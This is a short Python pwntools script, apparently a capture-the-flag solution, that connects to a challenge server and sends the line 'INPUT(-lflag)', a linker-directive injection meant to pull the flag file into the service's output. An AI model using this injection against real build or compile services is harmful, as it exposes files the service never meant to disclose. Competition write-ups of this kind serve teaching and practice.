#!/usr/bin/env python3

from pwn import *

r = remote("chall.polygl0ts.ch", 3200)
r.sendline("INPUT(-lflag)\n\n\n")
r.stream()
